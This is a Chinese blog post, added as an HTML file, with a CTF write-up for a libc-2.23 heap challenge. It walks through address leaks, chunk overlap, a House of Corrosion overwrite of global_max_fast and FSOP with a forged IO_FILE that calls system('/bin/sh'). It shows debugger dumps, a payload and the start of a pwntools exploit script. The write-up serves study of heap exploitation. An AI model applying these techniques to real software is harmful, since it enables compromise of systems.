@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"a1ph0nse.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="第四届“长城杯”信息安全铁人三项赛初赛的唯一一题pwn，做的时候没想到0xdeadbeef写在哪，有点难蚌。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="铁人三项heap2019">
+<meta property="og:url" content="https://a1ph0nse.github.io/2023/01/10/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/index.html">
+<meta property="og:site_name" content="a1ph0nse">
+<meta property="og:description" content="第四届“长城杯”信息安全铁人三项赛初赛的唯一一题pwn，做的时候没想到0xdeadbeef写在哪，有点难蚌。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://a1ph0nse.github.io/2023/01/10/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/1673449093269-1.png">
+<meta property="article:published_time" content="2023-01-10T10:50:21.000Z">
+<meta property="article:modified_time" content="2023-01-12T01:44:30.000Z">
+<meta property="article:author" content="a1ph0nse">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="house_of_xxx">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://a1ph0nse.github.io/2023/01/10/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/1673449093269-1.png">
+
+<link rel="canonical" href="https://a1ph0nse.github.io/2023/01/10/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>铁人三项heap2019 | a1ph0nse</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">a1ph0nse</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个菜狗的挣扎</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a1ph0nse.github.io/2023/01/10/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="a1ph0nse">
+      <meta itemprop="description" content="pwn菜狗、cs菜鸡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a1ph0nse">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          铁人三项heap2019
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-01-10 18:50:21" itemprop="dateCreated datePublished" datetime="2023-01-10T18:50:21+08:00">2023-01-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-01-12 09:44:30" itemprop="dateModified" datetime="2023-01-12T09:44:30+08:00">2023-01-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-wp/" itemprop="url" rel="index"><span itemprop="name">pwn_wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>第四届“长城杯”信息安全铁人三项赛初赛的唯一一题pwn，做的时候没想到0xdeadbeef写在哪，有点难蚌。</p>
+<span id="more"></span>
+
+<p>保护全开，先逆向看下。</p>
+<p>64位菜单堆题，libc-2.23，没有show，edit也不能edit chunk，不过可以写bss段上的一点东西，可以轻易得到一个任意地址写<code>0xdeadbeef</code>；alloc 限制了 size &gt; 0x90 &amp;&amp; size &lt;= 0x2333，申请不到<code>fast bin chunk</code>，不过使用的是<code>malloc</code>，没有对申请的内存进行清理；free没有问题。</p>
+<p><img src="./%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9heap2019/1673449093269-1.png" alt="img"></p>
+<p>利用的是House of Corrosion，将0xdeadbeef调整偏移写到<code>global_max_fast</code>。<code>global_max_fast</code>是一个libc中的全局变量，表示最大的fastbin chunk的大小，默认为<code>0x80</code>，在没有初始化堆的情况下为<code>0</code>。</p>
+<p>改写<code>globla_max_fast</code>可以让程序将更大的chunk视作fast bin chunk，在malloc和free的时候将作为fast bin chunk处理。<code>fastbinsY</code>中有10个元素，存放大小从<code>0x20~0xb0</code>的chunk，当超出该范围的chunk进入<code>fastbinsY</code>时，就会发生<strong>数组越界</strong>。利用此方法我们可以向<code>fastbinsY</code>后面的内存中写入一个堆地址（通过free），也可以取出后面内存中指针指向的chunk（如果可以malloc该size的话）。</p>
+<p>偏移和要处理的<code>chunk size</code>可以用此式子计算：<code>chunk size = (address-fastbinsY)* 2 + 0x20</code>（这个size包括了<code>header</code>），其中<code>chunk size</code>是处理的<code>chunk</code>的<code>size</code>，<code>address</code>是会写入或<code>malloc</code>的地址，<code>fastbinsY</code>为<code>fastbinsY</code>的地址。</p>
+<p>一开始打算将<code>globla_max_fast</code>写为<code>0xdead</code>，通过free直接将堆地址写入<code>_IO_list_all</code>打FSOP，结果free后的chunk中只有<code>fd</code>字段有内容，其余部分的内容都被清空了。这是fast bin特有的吗？unsorted bin好像不会，之前没太注意。</p>
+<p>后面参考了下main的思路，也有了些想法。</p>
+<ol>
+<li><p>main的思路：<code>leak -&gt; 利用任意地址0xde构造overlapping -&gt; 利用任意地址写0xde增大global_max_fast -&gt; 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -&gt; 分配到__malloc_hook附近修改__malloc_hook</code>。</p>
+</li>
+<li><p>同main的思路，但是打<code>IO</code>：<code>leak -&gt; 利用任意地址0xde构造overlapping -&gt; 利用任意地址写0xde增大global_max_fast -&gt; 利用overlapping修改fast bin chunk的fd配合任意地址写0xde实现任意地址分配 -&gt; 分配到_IO_list_all/vtable附近伪造IO_FILE/vtable -&gt; 走exit到_IO_OVERFLOW</code>（未尝试过）。</p>
+</li>
+<li><p>借鉴main的思路，利用<code>House of Corrosion</code>打<code>IO</code>：<code>leak -&gt; 利用任意地址0xde构造overlapping -&gt; 利用任意地址写0xdead增大global_max_fast -&gt; 利用House of Corrosion劫持_IO_list_all -&gt; 利用overlapping伪造IO_FILE -&gt; 走exit到_IO_OVERFLOW</code>。</p>
+</li>
+</ol>
+<p>下面先按照3的思路写：</p>
+<h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><p>这题泄露地址挺简单的，输入<code>2019</code>就会返回<code>bss</code>中的<code>heap_list</code>，借此可以泄露出程序基地址。</p>
+<p>libc和heap地址泄露也不难，程序中<code>malloc</code>时不会清理原有数据，因此可以借助<code>unsorted bin chunk的fd和bk</code>泄露libcbase和heapbase。</p>
+<h2 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h2><p>首先利用任意地址写<code>0xdeadbeef</code>修改<code>size</code>来构造overlapping，这波遇到了之前没有遇到的问题，也算是有些收获。</p>
+<p>ptmalloc<strong>完全依靠<code>chunk</code>的<code>prev_size</code>和<code>size</code>两个字段来判断chunk的使用情况和对chunk的前后块进行定位</strong>，即使<code>prev_size</code>和<code>size</code>是有问题的，只要能通过检查就能正常执行。</p>
+<p>在这道题中就是如此，利用任意地址写<code>0xdeadbeef</code>可以伪造<code>chunk</code>的<code>size</code>为<code>0xde</code>，这个<code>size</code>在64位系统下是不正常的，因为64位系统下的<code>size</code>是<code>0x10</code>对齐的，正常情况下不会出现这样<code>size</code>的<code>chunk</code>，这个<code>size</code>的<code>chunk</code>也无法被申请或切割得到，但是在本次利用中，并没有针对对齐的检查，这个<code>size</code>的<code>chunk</code>是可以使用的（除了不能直接malloc）。</p>
+<p>那要如何利用任意地址写<code>0xdeadbeef</code>修改<code>size</code>来构造overlapping呢？**关键在于伪造<code>chunk</code>前后的<code>prev_size</code>和<code>size</code>**。ptmalloc定位<code>next chunk</code>的方法是<code>chunk + (size - flags)</code>，通过此式子在对应的位置写入合理的<code>prev_size</code>和<code>size</code>，保证<code>size==next_chunk-&gt;prev_size</code>和<code>chunk+size==next_chunk</code></p>
+<p>本题中通过修改<code>free</code>后<code>chunk</code>的<code>size</code>为<code>0xde</code>实现初步的overlapping，但这是不够的。由于这个<code>size</code>的特殊性，                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        不能直接申请出来，因此只能通过切割来获取能申请出来的<code>chunk</code>，而这个<code>chunk</code>最大也只有<code>0xb0</code>的大小（<code>last_remainder&gt;=MIN_SIZE</code>才会切割），但就算这个<code>chunk</code>原来申请时申请最小的大小，<code>size</code>也要到<code>0xa0</code>（<code>malloc(0x98)</code>的情况下），最多只能控制到正常情况下下一个<code>chunk</code>的<code>fd</code>和<code>bk</code>，对于伪造<code>IO_FILE</code>是不够的（调试的时候看到即使是打<code>__malloc_hook</code>也不够）</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0x55bf8d2d10a0</span><br><span class="line">0x55bf8d2d10a0:	0xadbeef00000000a0	0x00000000000000de &lt;- 伪造 <span class="built_in">id</span>==1的chunk的size，原本为0xa1</span><br><span class="line">0x55bf8d2d10b0:	0x00007fd3f3138b78	0x00007fd3f3138b78</span><br><span class="line">0x55bf8d2d10c0:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x55bf8d2d10d0:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x55bf8d2d10e0:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x55bf8d2d10f0:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x55bf8d2d1100:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x55bf8d2d1110:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x55bf8d2d1120:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x55bf8d2d1130:	0x6262626262626262	0x6262626262626262</span><br><span class="line">0x55bf8d2d1140:	0x00000000000000a0	0x00000000000000a0 &lt;- <span class="built_in">id</span>==2</span><br><span class="line">0x55bf8d2d1150:	0x6363636363636363	0x6363636363636363 &lt;- 修改 size==de后可以堆叠到这里</span><br><span class="line">0x55bf8d2d1160:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x55bf8d2d1170:	0x6363636363636363	0x00000000000000d8</span><br><span class="line">0x55bf8d2d1180:	0x0000000000000061	0x6363636363636363</span><br><span class="line">0x55bf8d2d1190:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x55bf8d2d11a0:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x55bf8d2d11b0:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x55bf8d2d11c0:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x55bf8d2d11d0:	0x6363636363636363	0x6363636363636363</span><br><span class="line">pwndbg&gt; x/10gx 0x55bf8bcdd040</span><br><span class="line">0x55bf8bcdd040:	0x000055bf8d2d1010	0x0000000000000000 &lt;- heap_list</span><br><span class="line">0x55bf8bcdd050:	0x000055bf8d2d1150	0x000055bf8d2d11f0</span><br><span class="line">0x55bf8bcdd060:	0x000055bf8d2d2600	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>因此，我们要借助这个初步的overlapping得到更大范围的overlapping。由于我们可以控制到正常情况下，下一个<code>chunk</code>的<code>fd</code>和<code>bk</code>，那我们自然也可以控制其<code>prev_size</code>和<code>size</code>来再次实现overlapping，并且这次构造的<code>prev_size</code>和<code>size</code>的值可以由我们自行控制，我们甚至可以构造一个完整包含下一（几）个<code>chunk</code>的<code>size</code>，不过注意要在对应地方伪造<code>next_chunk-&gt;prev_size</code>。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x563da84b90a0</span><br><span class="line">0x563da84b90a0:	0xadbeef00000000a0	0x00000000000000b1 &lt;- <span class="built_in">id</span>==1</span><br><span class="line">0x563da84b90b0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x563da84b90c0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x563da84b90d0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x563da84b90e0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x563da84b90f0:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x563da84b9100:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x563da84b9110:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x563da84b9120:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x563da84b9130:	0x4141414141414141	0x4141414141414141</span><br><span class="line">0x563da84b9140:	0x0000000000000000	0x00000000000014b1 &lt;- 伪造 <span class="built_in">id</span>==2的chunk的size，原本为0xa0</span><br><span class="line">0x563da84b9150:	0x6363636363636363	0x0000000000000029 &lt;- 切割后chunk的位置</span><br><span class="line">0x563da84b9160:	0x00007f50b666db78	0x00007f50b666db78</span><br><span class="line">0x563da84b9170:	0x6363636363636363	0x0000000000000028</span><br><span class="line">0x563da84b9180:	0x0000000000000061	0x6363636363636363</span><br><span class="line">0x563da84b9190:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x563da84b91a0:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x563da84b91b0:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x563da84b91c0:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x563da84b91d0:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0x563da84b91e0:	0x00000000000000a0	0x0000000000001411  &lt;- <span class="built_in">id</span>==1</span><br><span class="line">0x563da84b91f0:	0x6464646464646464	0x6464646464646464</span><br><span class="line">0x563da84b9200:	0x6464646464646464	0x6464646464646464</span><br><span class="line">pwndbg&gt; x/10gx 0x563da7d62040</span><br><span class="line">0x563da7d62040:	0x0000563da84b9010	0x0000563da84b90b0 &lt;- heap_list</span><br><span class="line">0x563da7d62050:	0x0000563da84b9150	0x0000563da84b91f0</span><br><span class="line">0x563da7d62060:	0x0000563da84ba600	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>这里我选择的是构造完整包含下一个<code>chunk</code>的<code>size</code>，至此我们构造的overlapping已经足够了。</p>
+<h2 id="House-of-Corrision"><a href="#House-of-Corrision" class="headerlink" title="House of Corrision"></a>House of Corrision</h2><p><code>House of Corrosion</code>是一个很早的利用，<strong>通过改写全局变量<code>global_max_fast</code>来扩大fast bin chunk的大小范围，以此来实现对fastbinsY的数组越界利用</strong>，可以做到越界申请内存或写入一个堆地址。</p>
+<p>偏移和要处理的<code>chunk size</code>可以用此式子计算：<code>chunk size = (address-fastbinsY)* 2 + 0x20</code>（这个size包括了<code>header</code>），其中<code>chunk size</code>是处理的<code>chunk</code>的<code>size</code>，<code>address</code>是会写入或<code>malloc</code>的地址，<code>fastbinsY</code>为<code>fastbinsY</code>的地址。</p>
+<p>此处利用任意地址写<code>0xdead</code>来修改<code>global_max_fast</code>的大小，之后利用<code>free</code>将一个堆地址写到<code>_IO_list_all</code>来劫持<code>IO</code>流。被写的这个堆地址指向的<code>chunk</code>就是之前overlapping构造好的<code>chunk</code>，因此<code>size</code>需要提前计算好并设置。</p>
+<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>劫持<code>_IO_list_all</code>后就可以伪造一个<code>IO_FILE</code>结构体，并伪造其<code>vtable</code>（glibc-2.23没有对<code>vtable</code>的合法性检查），程序里面有<code>exit</code>的功能，会调用<code>exit()</code>，因此这里选择的是走<code>exit() -&gt; ... -&gt;  _IO_flush_all_lockp() -&gt; _IO_OVERFLOW</code>的链。</p>
+<p>为此伪造的IO_FILE需要满足以下条件：</p>
+<ol>
+<li><code>fp-&gt;_mode&lt;=0</code></li>
+<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
+</ol>
+<p>伪造<code>_flags=&quot;/bin/sh\x00&quot;</code>，<code>vtable</code>中的<code>_IO_OVERFLOW=system</code>，当调用<code>exit()</code>时就会一路调用到<code>system(&quot;/bin/sh\x00&quot;)</code>。</p>
+<p>伪造的<code>IO</code>如下：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># construct fake io</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(sys_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">fake_io=<span class="string">&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x1411</span>)</span><br><span class="line">fake_io+=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_io=fake_io.ljust(<span class="number">0xd8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io+=p64(heapbase+<span class="number">0x150</span>) <span class="comment"># vtable</span></span><br><span class="line">payload+=fake_io</span><br></pre></td></tr></table></figure>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">filename=<span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./&#x27;</span>+filename)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./&#x27;</span>+filename)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recvline(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> x                  :p.recvuntil(x)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;\n&#x27;</span></span>):</span><br><span class="line">  gdb.attach(p,cmd)</span><br><span class="line">  pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,content</span>):</span><br><span class="line">  ru(<span class="string">&quot;4.exit\n&quot;</span>)</span><br><span class="line">  sl(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">  ru(<span class="string">&quot;Content length:\n&quot;</span>)</span><br><span class="line">  sl(<span class="built_in">str</span>(length))</span><br><span class="line">  ru(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">  s(<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">  ru(<span class="string">&quot;4.exit\n&quot;</span>)</span><br><span class="line">  sl(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">  ru(<span class="string">&quot;Content id:\n&quot;</span>)</span><br><span class="line">  sl(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">addr</span>):</span><br><span class="line">  ru(<span class="string">&quot;4.exit\n&quot;</span>)</span><br><span class="line">  sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">  ru(<span class="string">&quot;Comment:\n&quot;</span>)</span><br><span class="line">  s(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_heap_addr</span>():</span><br><span class="line">  ru(<span class="string">&quot;4.exit\n&quot;</span>)</span><br><span class="line">  sl(<span class="string">&quot;2019&quot;</span>)</span><br><span class="line">  heap_list=ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">  heap_list=<span class="built_in">int</span>(heap_list[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">  <span class="keyword">return</span> heap_list</span><br><span class="line"></span><br><span 